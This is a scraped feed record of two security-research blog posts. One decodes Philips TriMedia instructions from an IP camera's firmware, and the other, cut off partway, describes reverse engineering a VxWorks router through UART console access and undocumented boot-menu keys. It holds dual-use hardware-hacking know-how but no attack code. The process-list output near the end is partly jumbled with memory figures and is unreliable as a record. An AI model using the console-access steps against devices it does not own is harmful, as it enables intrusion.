((x&gt;&gt;7) &amp; 0x3ff&lt;&lt;14) | ((x&gt;&gt;10) &amp; 0xff&lt;&lt;24))</span>\n</pre> \n  </div> \n  <p>As you can read, there is a small comment about the meaning of each bit but, in some cases, depending on the size of the operation, the same bit has a different interpretation. For example, in a 34 bit operation, bit 33 gives the operation code (opcode) but in a 42 bits operation, bit 33 corresponds to some special cases and you have to look at bits 21 to 28 to get the real opcode (look from the <a class=\"reference external\" href=\"https://github.com/poxyran/tm32disassembler/blob/master/tm32decode.c#L152\">line 152</a> onwards in the <em>tm32decode.c</em> file). Pretty homogeneous, uh? ;p</p> \n  <p>In our case, our first instruction is composed of 5 operations with 40 bits each. When dealing with 32 and 40 bit operations, there are two types of opcodes: with 4 bits (short opcodes) or 7 bits (long opcodes). In the case of 40 bits operations, there is one more thing to handle, uncompressed jumps.</p> \n  <p>For 24 bits operations, the opcode is given by bits 21 to 25.</p> \n  <p>For 32 bits operations, bit 33 is used as a flag to determine if there is a short or long opcode. If false, then opcode is short, otherwise it's a long opcode. In the case of a short opcode, you have to look at bits 21 to 25. In the case of a long opcode, you have to look at bits 21 to 28.</p> \n  <p>In the case of a 40 bits operation, you start by looking at bit 33 of the operation stream. If this bit is set, it means you have an operation identified as <tt class=\"docutils literal\">zeroary_param32</tt>, which is, basically, an operation with 0 operands, e.g. <tt class=\"docutils literal\">iimm/uimm</tt> (load signed/unsigned 32 bit immediate). If the bit is not set, you have an operation identified as <tt class=\"docutils literal\">zeroary_param32_resultless</tt>, this is an operation with 0 operands and no result, for example, a <tt class=\"docutils literal\">jmpi</tt>. In the particular case of a <tt class=\"docutils literal\">jmpi/ijmpi</tt> operation, bit 32 must be false too. If bit 31 is true, then it's a <tt class=\"docutils literal\">jmpi</tt> otherwise is a <tt class=\"docutils literal\">ijmpi</tt>.</p> \n  <p>When bit 33 or bit 32 are false in a 40 bits operation, then we have a long opcode operation. If this is the case, the operation code is located at bits 21 to 28.</p> \n  <p>Now that we know all these things, let's try to decode our unpacked instruction bytes.</p> \n  <p>From the previous section, we know what our operations bytes are and what their extension bytes are.</p> \n  <p>The number representing these bytes is packed as an <tt class=\"docutils literal\">uint64_t</tt> integer. In the case of our first operation, the number is <tt class=\"docutils literal\">1191876510593</tt> (11581604381h). If you pay attention to this number (in hex), you will note that the last six digits, from right to left, represent the operation bytes. The remaining bytes contain format bits and extension bytes but are packed in a different way. In order to make it fit in the 64 bit integer and to ease the decoding operation, <tt class=\"docutils literal\">tm32disassembler</tt> performs some operations over those bytes as swap, shift left and logical <tt class=\"docutils literal\">or</tt>. If you want more details about these operations, let us look at lines between <a class=\"reference external\" href=\"https://github.com/poxyran/tm32disassembler/blob/master/tm32unpack.c#L78\">#78</a> and <a class=\"reference external\" href=\"https://github.com/poxyran/tm32disassembler/blob/master/tm32unpack.c#L125\">#125</a> of the <tt class=\"docutils literal\">tm32unpack.c</tt> file from the <tt class=\"docutils literal\">tm32disassembler</tt> project.</p> \n  <p>In order to continue, please, take a look at our number in binary:</p> \n  <pre class=\"literal-block\">\n0000 0000 0000 0000 0000 0001 0001 0101 1000 0001 0110 0000 0100 0011 1000 0001\n</pre> \n  <p>We know that the size of our first operation is 40 so we have to look at bit 33 to see if it's a <tt class=\"docutils literal\">zeroary_param32</tt> or a <tt class=\"docutils literal\">zeroary_param32_resultless</tt>. In this case, bit 33 is 0 thus we are in the <tt class=\"docutils literal\">zeroary_param32_resultless</tt> way. Then, as bit 32 is 1, we know that our operation is not a <tt class=\"docutils literal\">jmpi/ijmpi</tt> but a long opcode operation so we have to look at bits 21 to 28. In order to do so, just shift left 21 positions and get the 8 bits from there with a logical <tt class=\"docutils literal\">and</tt> with 0xFF. This is the output from a Python interpreter:</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"mi\">1191876510593</span><span class=\"o\">&gt;&gt;</span><span class=\"mi\">21</span>\n<span class=\"il\">568331L</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"nb\">hex</span><span class=\"p\">(</span><span class=\"mi\">1191876510593</span><span class=\"o\">&gt;&gt;</span><span class=\"mi\">21</span><span class=\"p\">)</span>\n<span class=\"s1\">'0x8ac0bL'</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"mh\">0x8ac0b</span> <span class=\"o\">&amp;</span> <span class=\"mh\">0xff</span>\n<span class=\"mi\">11</span>\n</pre> \n  </div> \n  <p>In binary:</p> \n  <pre class=\"literal-block\">\n0000 1011\n</pre> \n  <p>Now we know the operation code (opcode) for our first operation: 11. This opcode corresponds to the <tt class=\"docutils literal\">asli</tt> operation, an <em>arithmetic shift left immediate</em> which takes a single argument in <tt class=\"docutils literal\">rsrc1</tt> and an immediate modifier <tt class=\"docutils literal\">n</tt> and produces a result in <tt class=\"docutils literal\">rdest</tt> equal to <tt class=\"docutils literal\">rsrc1</tt> arithmetically shifted left by <tt class=\"docutils literal\">n</tt> bits. This operation is defined as <tt class=\"docutils literal\">UNARY_PARAM7_SHORT</tt> (because of the immediate value with 7 bits), it can be guarded, it has one argument (<tt class=\"docutils literal\">rsrc1</tt>) and one immediate value (<tt class=\"docutils literal\">n</tt>) and a result that's stored in another register (<tt class=\"docutils literal\">rdest</tt>). It means we have to get all those operation <tt class=\"docutils literal\">parameters</tt> in order to fully disassemble it. All these parameters vary depending on the type of operation. It's not the same to have an operation defined as <tt class=\"docutils literal\">UNARY_PARAM7_SHORT</tt> or as <tt class=\"docutils literal\">UNARY_PARAM7_UNGUARDED</tt> (this is true only when speaking about 40 bits operations).</p> \n  <p>In the case of a <tt class=\"docutils literal\">UNARY_PARAM7_SHORT</tt> operation, the guard is taken from bits 14 to 20, the immediate value is taken from bits 7 to 13, the only argument is taken from bits 0 to 6 and, finally, bits 35 to 41 indicate the <tt class=\"docutils literal\">rdest</tt> register (result). The process to get all these parameters is simple: just left shift the bits to the corresponding offset and perform a logical <tt class=\"docutils literal\">and</tt> with the necessary bitmask in order to get the amount of bits that are needed:</p> \n  <ul class=\"simple\"> \n   <li>guarded register (bits 14 to 20): 000001 (1);</li> \n   <li><tt class=\"docutils literal\">rsrc1</tt> register (bits 0 to 6): 000001 (1);</li> \n   <li>immediate value (bits 7 to 13): 0000111 (7);</li> \n   <li><tt class=\"docutils literal\">rdest</tt> register (bits 35 to 41): 0100010 (34).</li> \n  </ul> \n  <p>In the case of the parameters indicating registers (<tt class=\"docutils literal\">rsrc1</tt>, <tt class=\"docutils literal\">rdest</tt> and the guarded register), the resulting number indicates the number of registers involved in the operation. In the case of an immediate value, the resulting number indicates the number itself.</p> \n  <p>Please, note that <tt class=\"docutils literal\">r1</tt> is used as a guarded register. This is a special register which always contains the value 1 (by definition in the datasheet), so it makes no sense to guard the instruction because the condition will always be <tt class=\"docutils literal\">TRUE</tt>, so it is always executed. However, <tt class=\"docutils literal\">tm32disassmebler</tt> explicitly shows these cases, probably to indicate that the operation is <tt class=\"docutils literal\">guarded</tt>.</p> \n  <p>In our case, the first operation can be constructed like this <tt class=\"docutils literal\">asli(7) r1 <span class=\"pre\">-&gt;</span> r34</tt> or, if you prefer to be more compliant with the explicit form, <tt class=\"docutils literal\">if r1 asli(7) r1 <span class=\"pre\">-&gt;</span> r34</tt>.</p> \n  <p>Now that we know the required steps to disassemble an operation, we can repeat all the steps mentioned before in order to continue disassembling the rest of the operations in the instruction.</p> \n  <p>If you want more details about the decoding process, please, take a look at the <a class=\"reference external\" href=\"https://github.com/poxyran/tm32disassembler/blob/master/tm32decode.c\">tm32decode.c</a> file from the <tt class=\"docutils literal\">tm32disassembler</tt> project.</p> \n </div> \n</div> \n<div class=\"section\" id=\"conclusion\"> \n <h2>Conclusion</h2> \n <p>In this third part, we studied how a Philips TriMedia instruction can be disassembled. We went through the whole process describing in detail the mechanism of each of the four main steps required to finally disassemble a compressed instruction.</p> \n <p>In general, the study of old and new, various, and sometimes awkward CPU architectures, gives us some experience about how they work internally. This is specially important in the embedded world, because you have to deal daily with the analysis of various software running on many different platforms, and sometimes tied to specific designed hardware with uncommon architectures.</p> \n <p>I hope the blogpost series I've written about Philips TriMedia can help anyone out there analyze this architecture in the future as the previously mentioned articles and tools helped me to take this project forward. It is not finished yet, there are some aspects I would like to further dig into but I guess it's time to take some fresh air from TriMedia, it wasn't easy :)</p> \n</div> \n<div class=\"section\" id=\"what-s-next\"> \n <h2>What's next?</h2> \n <p>As I said, there are a few things I would like to do in the future related to Philips TriMedia. One would be to have a live debug session on real hardware. Unfortunately, as you saw, it's not easy to get the hardware and SDK.</p> \n <p>Something more at my fingertips is the idea to develop an IDA/Ghidra plugin to add support for this architecture to those tools. Also, I'd like to add support for TriMedia to Capstone disassembler.</p> \n</div> \n<div class=\"section\" id=\"bonus-track\"> \n <h2>Bonus Track</h2> \n <p>Remember the first MB of data I extracted from the D-Link IP camera in the <a class=\"reference external\" href=\"https://blog.quarkslab.com/reverse-engineering-a-philips-trimedia-cpu-based-ip-camera-part-1.html\">first part of the series</a>? We saw that the entropy analysis from <tt class=\"docutils literal\">binwalk</tt> showed high entropy on the first MB of data. Basically, that was a sign that our data was encrypted or compressed. Now, we can conclude that what <tt class=\"docutils literal\">binwalk</tt> detected was the compression scheme used by Philips TriMedia. By using the public <tt class=\"docutils literal\">tm32disassembler</tt> and using it against the first MB of data, we can see that all the bytes are interpreted correctly as TriMedia instructions. The length of the final output, without debug information, is 32 MB:</p> \n <pre class=\"literal-block\">\nRead in 978627 (0xeeec3) bytes from file 'tests\\almost_first_mb.bin'\nDisassembling 978627 (0xeeec3) bytes\n\ndisassembly\n\n(* instruction 0   : 224 bits (28 bytes) long *)\n(* offset          : 0x00000000 *)\n(* bytes           : 00 18 4c 0c c0 80 c0 81 c3 80 c0 b5 c0 81 02 00 12 00 8c 00 20 90 40 40 40 20 a0 d0 *)\n(* format bytes    : 0x0018 &amp; 0xff03 = 0x0000, format in little endian bit order: 00 00 00 00 00  *)\n   IF r1   uimm(0x61a618) -&gt; r0,               (* 42 bits: 0 02 30 c0 0c 4c *)\n   IF r7   ijmpi(0x90030001),                  (* 42 bits: 2 40 81 81 c0 80 *)\n   IF r2   fadd r67 r1 -&gt; r32,                 (* 42 bits: 1 01 02 c0 80 c3 *)\n   IF r10  bitand r64 r3 -&gt; r16,               (* 42 bits: 0 81 02 02 81 c0 *)\n   IF r1   uimm(0xd0060024) -&gt; r0;             (* 42 bits: 3 42 83 00 12 00 *)\n\n(* instruction 1   : 144 bits (18 bytes) long *)\n(* offset          : 0x0000001c *)\n(* bytes           : e0 60 41 40 02 c0 c5 65 d0 41 18 08 10 80 42 5f 20 60 *)\n(* format bytes    : 0xe060 &amp; 0xff03 = 0xe000, format in little endian bit order: 00 00 01 11 00  *)\n   IF r1   uld8d(0) r65 -&gt; r9,                 (* 26 bits: 1 02 40 41 *)\n   IF r1   asl r64 r11 -&gt; r23,                 (* 26 bits: 2 65 c5 c0 *)\n   IF r1   igtri(3) r80 -&gt; r97,                (* 26 bits: 0 18 41 d0 *)\n   IF r1   ilesi(0) r16 -&gt; r10,                (* 26 bits: 0 42 80 10 *)\n   26: ILLEGAL OP! = ineqi;                    (* 26 bits: 0 60 20 5f *)\n\n[..]\n\n(* instruction 1982 : 152 bits (19 bytes) long *)\n(* offset          : 0x000eeebd *)\n(* bytes           : 2e 68 74 6d 6c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 *)\n(* format bytes    : 0x2e68 &amp; 0xff03 = 0x2e00, format in little endian bit order: 01 11 01 00 00  *)\n   IF r49  jmpi(0x2fa5a),                      (* 42 bits: 0 00 01 6c 6d 74 *)\n   IF r1   bitand r0 r0 -&gt; r0,                 (* 26 bits: 2 00 00 00 *)\n   IF r1   nop,                                (*  0 bits: *)\n   IF r0   bitand r0 r0 -&gt; r0,                 (* 34 bits: 0 02 00 00 00 *)\n   IF r1   nop;                                (* 34 bits: 0 00 00 00 00 *)\n\n\nend disassembly\n</pre> \n <p>The output shows the first two disassembled instructions and the last one. Finally, the enigma of the mysterious data was solved. I haven't analyzed the semantic of the disassembled code but I guess it is the initialization code for the bootloader and kernel of the OS (pSOS).</p> \n</div> \n<div class=\"section\" id=\"considerations-about-the-public-tm32disassembler\"> \n <h2>Considerations about the public <tt class=\"docutils literal\">tm32disassembler</tt></h2> \n <p>If you paid attention to the disassembly output from the first MB of data extracted from the D-Link IP camera and remember what I said about CPU registers in the <a class=\"reference external\" href=\"https://blog.quarkslab.com/reverse-engineering-a-philips-trimedia-cpu-based-ip-camera-part-2.html\">second part of the series</a> I'm sure you have noticed that there are some inconsistencies. For example, by definition, registers <tt class=\"docutils literal\">r0</tt> and <tt class=\"docutils literal\">r1</tt> are used as booleans and can't be modified. Here's a little quote from section 3.1 from the datasheet of the <tt class=\"docutils literal\">PNX1302</tt>:</p> \n <pre class=\"literal-block\">\nRegister r0 always contains the integer value '0', corresponding\nto the boolean value 'FALSE' or the single-precision\nfloating point value +0.0. Register r1 always contains\nthe integer value '1' ('TRUE'). The programmer is\nNOT allowed to write to r0 or r1.\nNote: Writing to r0 or r1 may cause reads from r0 or\nr1 scheduled in adjacent clock cycles to return unpredictable\nvalues. The standard assembler prevents/\nforbids the use of r0 or r1 as a destination register.\n</pre> \n <p>However, if you look at the following operation from the first disassembled instruction, you will notice that the constant value from the <tt class=\"docutils literal\">uimm</tt> operation is stored in <tt class=\"docutils literal\">r0</tt>:</p> \n <pre class=\"literal-block\">\nIF r1   uimm(0xd0060024) -&gt; r0\n</pre> \n <p>Basically, the <tt class=\"docutils literal\">iumm</tt> operation stores the immediate value on a given register. In this case, it is trying to store the value <tt class=\"docutils literal\">0xd0060024</tt> into the <tt class=\"docutils literal\">r0</tt> register. In my understanding, that's not possible because of the previous sentence. I didn't dig into the potential bug, though. Maybe this is possible in newer TM microprocessors, but at least in the PNX1300 series it is not.</p> \n <p>Also, in the same sentence, there's another inconsistency: <tt class=\"docutils literal\">uimm</tt> is an operation that, by definition, is not <tt class=\"docutils literal\">guarded</tt> at all. So, the <tt class=\"docutils literal\">IF r1</tt> syntax part makes no sense at all. Anyway, <tt class=\"docutils literal\">r1</tt> is always <tt class=\"docutils literal\">TRUE</tt> so that part could have been omitted.</p> \n <p>Apart from that, there are other inconsistencies. I tried to contact the author of the disassembler to inform them about these inconsistencies without success, so be careful when analyzing the output from the disassembler, you will have to read the datasheet first :P</p> \n</div> \n<div class=\"section\" id=\"acknowledgements\"> \n <h2>Acknowledgements</h2> \n <p>Thanks to all my Quarkslab colleagues who proofread this article and provided valuable feedback.</p> \n</div> \n<div class=\"section\" id=\"references\"> \n <h2>References</h2> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id12\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/reverse-engineering-a-philips-trimedia-cpu-based-ip-camera-part-3.html#id7\">[1]</a></td> \n    <td><a class=\"reference external\" href=\"https://github.com/crackinglandia/trimedia/blob/master/asm/extensionbytes.pdf\">https://github.com/crackinglandia/trimedia/blob/master/asm/extensionbytes.pdf</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id13\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/reverse-engineering-a-philips-trimedia-cpu-based-ip-camera-part-3.html#id8\">[2]</a></td> \n    <td><a class=\"reference external\" href=\"https://github.com/crackinglandia/trimedia/blob/master/asm/compressionschemetable.pdf\">https://github.com/crackinglandia/trimedia/blob/master/asm/compressionschemetable.pdf</a></td> \n   </tr> \n  </tbody> \n </table> \n</div>","descriptionType":"html","publishedDate":"Wed, 15 Jan 2020 23:00:00 +0000","feedId":11110,"bgimg":"http://blog.quarkslab.com/resources/2020-01-16_reversing-trimedia-part-3/tminstruction.png","linkMd5":"83ba6cdf4912af08e5b4a404183a7181","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn29@2020_1/2020/08/25/01-15-08-888_de1afb90eb844436.webp","destWidth":781,"destHeight":150,"sourceBytes":14851,"destBytes":23976,"author":"Nahuel Riva","articleImgCdnMap":{"http://blog.quarkslab.com/resources/2020-01-16_reversing-trimedia-part-3/tminstruction.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn29@2020_1/2020/08/25/01-15-08-888_de1afb90eb844436.webp","http://blog.quarkslab.com/resources/2020-01-16_reversing-trimedia-part-3/format_bits.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn70@2020_3/2020/08/25/01-15-15-607_1484525c035c59f3.webp","http://blog.quarkslab.com/resources/2020-01-16_reversing-trimedia-part-3/operations.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn68@2020_5/2020/08/25/01-15-14-613_7a4fcb951be144e4.webp"},"publishedOrCreatedDate":1598318092723},{"createdTime":"2020-08-25 09:14:52","updatedTime":"2020-08-25 09:14:52","title":"Reverse Engineering a VxWorks OS Based Router","link":"http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html","description":"<div class=\"section\" id=\"introduction\"> \n <h2>Introduction</h2> \n <p>Embedded devices are a huge and wide world of options for CPU architectures, operating systems and file systems. You can find the combination you can think of. In this case, I'll present a study about the <a class=\"reference external\" href=\"https://static.tp-link.com/resources/document/datasheet/TL-WR543G_ds.zip\">TP-Link TL-WR543G</a>. This old router I had at home came equipped with a MIPS CPU and <a class=\"reference external\" href=\"https://www.windriver.com/products/vxworks/\">VxWorks</a> as its OS.</p> \n <p>In this blog post, I'll show you my adventures with the reverse engineering process of this VXWorks based device. I'm going to explain my findings and all my fails when dealing with the firmware and binary analysis, which are the main reasons I'm writing this down.</p> \n</div> \n<div class=\"section\" id=\"vxworks-little-overview\"> \n <h2>VxWorks little overview</h2> \n <p>As said previously, the WR543G router runs VxWorks. VxWorks is a proprietary <a class=\"reference external\" href=\"https://en.wikipedia.org/wiki/Real-time_operating_system\">RTOS</a> developed by Wind River Systems. It supports many architectures like Intel, Power-PC, ARM, MIPS, etc. It has its own development suite called Wind River Workbench that includes an editor, compiler toolchain, debugger, and emulator.</p> \n <p>VxWorks is used by products across a wide range of market areas: aerospace and defense, automotive, industrial such as robots, consumer electronics, medical area and networking.</p> \n <p>As VXWorks is a proprietary OS, it has many vendor specific attributes, this includes the security model. For example, Stack Overflow Detection for user programs. The firmware structure and file system are also vendor specific.</p> \n <p>If you are, like me, used to reverse other kinds of devices that usually include Unix-like OSes, you'll find that VxWorks requires a little more work in order to obtain the <em>Grail</em>.</p> \n <p>If you want to read more about VxWorks, you can refer to the <a class=\"reference internal\" href=\"http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html#vxworks-related-work\">VxWorks related work</a> section at the end of this article.</p> \n</div> \n<div class=\"section\" id=\"how-things-happened\"> \n <h2>How things happened</h2> \n <p>This wasn't the first time I looked into this router. Some time ago, I tried to reverse the firmware but I didn't make much progress on that path. So, I decided to open the case and see what was inside. The hardware approach also conducted me to a dead end as I didn't want to unsolder anything at that time. So I put it aside for a while until now. I wanted to understand how the firmware was built and what could be extracted from it in order to do a deeper analysis. There isn't too much information available about VxWorks internals, just a few posts from <a class=\"reference external\" href=\"http://www.devttys0.com/?s=VxWorks\">devttys0</a> and some others in Chinese language. However, those were enough for me to have a very good progress with the reversing process. So, after a short introduction about the hardware analysis, I'll focus more on the firmware analysis.</p> \n</div> \n<div class=\"section\" id=\"hardware-analysis\"> \n <h2>Hardware analysis</h2> \n <div class=\"section\" id=\"description\"> \n  <h3>Description</h3> \n  <ul class=\"simple\"> \n   <li>CPU: Atheros AR2317-AC1A (all integrated, WiFi, MIPS 4000)</li> \n   <li>Flash: Z-16PGJI-016S338-S9178PC7 (2MB?)</li> \n   <li>SDRAM: EM639165TS-6G, 16 MB</li> \n   <li>Ethernet: Marvell 88E6060-RCJ1</li> \n   <li>UART: Yes</li> \n  </ul> \n  <p>Regarding the flash memory, the previous version (WR542G) was 2 MB in size. I couldn't find too much info with the serial number so I suppose the size of the flash is similar in this case.</p> \n  <p>The following are some pictures from the main board.</p> \n </div> \n <div class=\"section\" id=\"front\"> \n  <h3>Front</h3> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/front.jpg\" style=\"width: 500px;\" /> \n </div> \n <div class=\"section\" id=\"back\"> \n  <h3>Back</h3> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/back.jpg\" style=\"width: 500px;\" /> \n </div> \n <div class=\"section\" id=\"cpu-ram-flash\"> \n  <h3>CPU, RAM, Flash</h3> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/chips.jpg\" style=\"width: 500px;\" /> \n </div> \n <div class=\"section\" id=\"serial-port\"> \n  <h3>Serial port</h3> \n  <p>When looking at the main board, you can see that there's a pinout similar to <a class=\"reference external\" href=\"https://en.wikipedia.org/wiki/Universal_asynchronous_receiver-transmitter\">UART (Universal asynchronous receiver-transmitter)</a>. I followed the methodology mentioned in this <a class=\"reference external\" href=\"http://www.devttys0.com/2012/11/reverse-engineering-serial-ports/\">devttys0's blog post</a> in order to reverse engineer the pins. You can see them in the following picture:</p> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/uart.jpg\" style=\"width: 500px;\" /> \n  <p>These are the UART parameters: COM3 (in my case, check yours), Baudrate: 38400</p> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/putty-config.PNG\" style=\"width: 500px;\" /> \n  <p>Once I set the UART interface up, I was able to access the boot log and boot menu:</p> \n  <pre class=\"literal-block\">\nAR2315 rev 0x00000090 startup...\nAttached TCP/IP interface to ae unit 0\nAttaching interface lo0...done\n\nUSRCONF : g_size = 18112\nName = MODULE_USR_CONF_T , size = 12\nName = UC_IEEE802_1X_CFG_DATA_T , size = 512\nName = UC_ADVANCED_CFG_T , size = 16\nName = UC_ARP_CFG_T , size = 32\nName = UC_BPA_CFG_DATA_T , size = 912\nName = UC_DDNS_T , size = 1480\nName = UC_DHCPC_CFG_DATA_T , size = 416\nName = UC_DHCPS_CFG_AND_STATIC_T , size = 708\nName = UC_FIRE_WALL_STATE_T , size = 1992\nName = UC_FORWARD_VIRTUAL_SERVE_CLASS_T , size = 1572\nName = UC_IFQOS_ROUTER_CONF_FLASH_T , size = 120\nName = UC_LAN_CFG_DATA_T , size = 8\nName = UC_L2TP_CFG_DATA_T , size = 1472\nName = UC_MAC_CONFIG_T , size = 80\nName = UC_PPPOE_CFG_DATA_T , size = 1568\nName = UC_NTP_PREFER_SRV_CFG_DATA_T , size = 28\nName = UC_STATIC_IP_CFG_DATA_T , size = 144\nName = UC_SATTIC_ROUTE_CFG_DATA_T , size = 328\nName = UC_MANAGE_USERS_T , size = 64\nName = UC_UTILITIES_T , size = 16\nName = UC_WANCONNTYPE_T , size = 16\nName = UC_WLAN_CFG_T , size = 5020\nName = UC_PPTP_CFG_DATA_T , size = 1472\nName = UC_NETWORK_PSEUDO_T , size = 4\nName = UC_IFQOS_ROUTER_CONF_FLASH_T , size = 120\nPort QoS..................\nqos_IFInit..................\nqos_IFLoadFromFlash..................\nwireless access point starting...\nwlan0 Ready\n\n\nentering tddp...\n\n\n\n                                                        Software Platform for ARM\n  Copyright(C) 2001-2004 by TP-LINK TECHNOLOGIES CO., LTD.\n  Creation date: Sep  4 2008, 17:18:51\n\n  Press CTRL-B to enter bootmenu...\n\n  Boot Menu:\n         1:  Download application program\n         2:  Modify Bootrom password\n         3:  Exit the menu\n         4:  Reboot\n         5:  User commond line\n</pre> \n  <p>One interesting thing is that the boot log refers to <em>AR2315</em> instead of <em>AR2317</em>. The <em>AR2315</em> is a MIPS 4KE 32-bit with 183 MHz processor.</p> \n  <p>Another important thing to mention is that the boot menu doesn't work at all. If you press any of the reported commands, nothing happens (Btw, I'm using an English keyboard, if you ask). However, when trying other keys, we obtain the following results:</p> \n  <ul class=\"simple\"> \n   <li><em>n</em>: netstat</li> \n  </ul> \n  <pre class=\"literal-block\">\n  Boot Menu:\n         1:  Download application program\n         2:  Modify Bootrom password\n         3:  Exit the menu\n         4:  Reboot\n         5:  User commond line\n                Enter your choice(1-4):n\n413\nActive Internet connections (including servers)\nPCB      Proto Recv-Q Send-Q  Local Address      Foreign Address    (state)\n-------- ----- ------ ------  ------------------ ------------------ -------\n80fb7f08 TCP        0      0  0.0.0.0.80            0.0.0.0.0             LISTEN\n80fb8538 UDP        0      0  0.0.0.0.2050          0.0.0.0.0\n80fb84b4 UDP        0      0  0.0.0.0.53            0.0.0.0.0\n80fb8430 UDP        0      0  0.0.0.0.67            0.0.0.0.0\n80fb83ac UDP        0      0  0.0.0.0.68            0.0.0.0.0\n</pre> \n  <p>It seems an HTTP server is running. This is the report from <em>nmap</em>:</p> \n  <pre class=\"literal-block\">\nNmap scan report for 192.168.1.1\n\nHost is up (0.0044s latency).\n\nNot shown: 98 filtered ports\n\nPORT     STATE  SERVICE\n\n80/tcp   open   http\n\n1900/tcp closed upnp\n\nMAC Address: 00:27:19:C1:76:52 (Tp-link Technologies)\n</pre> \n  <ul class=\"simple\"> \n   <li><em>i</em>: ifconfig</li> \n  </ul> \n  <pre class=\"literal-block\">\n  Boot Menu:\n         1:  Download application program\n         2:  Modify Bootrom password\n         3:  Exit the menu\n         4:  Reboot\n         5:  User commond line\n                Enter your choice(1-4):i\n\nae (unit number 0):\n         Flags: (0x8b63) UP BROADCAST MULTICAST PROMISCUOUS ARP RUNNING\n         Type: ETHERNET_CSMACD\n         Internet address: 192.168.1.1\n         Broadcast address: 192.168.1.255\n         Netmask 0xffffff00 Subnetmask 0xffffff00\n         Ethernet address is 00:27:19:c1:76:52\n         Metric is 0\n         Maximum Transfer Unit size is 1500\n         0 octets received\n         126 octets sent\n         0 packets received\n         3 packets sent\n         0 non-unicast packets received\n         0 non-unicast packets sent\n         0 unicast packets received\n         3 unicast packets sent\n         0 input discards\n         0 input unknown protocols\n         0 input errors\n         0 output errors\n         0 collisions; 0 dropped\nlo (unit number 0):\n         Flags: (0x8069) UP LOOPBACK MULTICAST ARP RUNNING\n         Type: SOFTWARE_LOOPBACK\n         Internet address: 127.0.0.1\n         Netmask 0xff000000 Subnetmask 0xff000000\n         Metric is 0\n         Maximum Transfer Unit size is 32768\n         1 packets received; 1 packets sent\n         0 multicast packets received\n         0 multicast packets sent\n         0 input errors; 0 output errors\n         0 collisions; 0 dropped\nae (unit number 1):\n         Flags: (0x8b63) UP BROADCAST MULTICAST PROMISCUOUS ARP RUNNING\n         Type: ETHERNET_CSMACD\n         Internet address: 10.1.177.242\n         Broadcast address: 10.1.177.243\n         Netmask 0xff000000 Subnetmask 0xfffffffc\n         Ethernet address is 00:1b:fc:0e:b1:f2\n         Metric is 0\n         Maximum Transfer Unit size is 1500\n         13696 octets received\n         27868 octets sent\n         31 packets received\n         63 packets sent\n         0 non-unicast packets received\n         31 non-unicast packets sent\n         31 unicast packets received\n         32 unicast packets sent\n         0 input discards\n         0 input unknown protocols\n         0 input errors\n         0 output errors\n         0 collisions; 0 dropped\nppp (unit number 1):\n         Flags: (0xb0) DOWN POINT-TO-POINT\n         Type: PPP\n         Metric is 0\n         Maximum Transfer Unit size is 1400\n         0 octets received\n         0 octets sent\n         0 packets received\n         0 packets sent\n         0 non-unicast packets received\n         0 non-unicast packets sent\n         0 unicast packets received\n         0 unicast packets sent\n         0 input discards\n         0 input unknown protocols\n         0 input errors\n         0 output errors\n</pre> \n  <ul class=\"simple\"> \n   <li><em>m</em>: meminfo</li> \n  </ul> \n  <pre class=\"literal-block\">\n  Boot Menu:\n         1:  Download application program\n         2:  Modify Bootrom password\n         3:  Exit the menu\n         4:  Reboot\n         5:  User commond line\n                Enter your choice(1-4):m\n501\n\nFREE LIST:\n   num    addr       size\n  ---- ---------- ----------\n         1 0x80b693d0         64\n         2 0x80ffb1f0      13056\n         3 0x80ff6770         96\n         4 0x80b66b60        976\n         5 0x8038df30    8062064\n         6 0x80f9fb80        240\n\n\nSUMMARY:\n status    bytes     blocks   avg block  max block\n ------ ---------- --------- ---------- ----------\ncurrent\n   free    8076496         6    1346082    8062064\n  alloc    4973520      1459       3408          -\ncumulative\n  alloc    4992304      1523       3277          -\n</pre> \n  <ul class=\"simple\"> \n   <li><em>k</em>: process list</li> \n  </ul> \n  <pre class=\"literal-block\">\n  Boot Menu:\n         1:  Download application program\n         2:  Modify Bootrom password\n         3:  Exit the menu\n         4:  Reboot\n         5:  User commond line\n                Enter your choice(1-4):k\n\n\n  NAME        ENTRY       TID    PRI   STATUS      PC       SP     ERRNO  DELAY\n---------- ------------ -------- --- ---------- -------- -------- ------- -----\n --tExcTask   801c19c4     80ff5380   0 PEND       801e3c50 80ff5260       0     0\n-tLogTask   801c6c54     80ff27f0   0 PEND       801e3c50 80ff26d8     --- ---------- --------- --------- ----------\ncurrent\n   free   8076496         6    346082    8062064  alloc    4973520      1459       3408          -\ncumulative\n  alloc    4992304      1523     377          -\n  0     0\nbootromTask8005ad30     80b65be0   8 READY      801dc998 80b64e40  3d0002     0\ntWlanCal   800ef730     80be2ba0  10 PEND       801e3c50 80be2ab0       0     0\ntApCserv   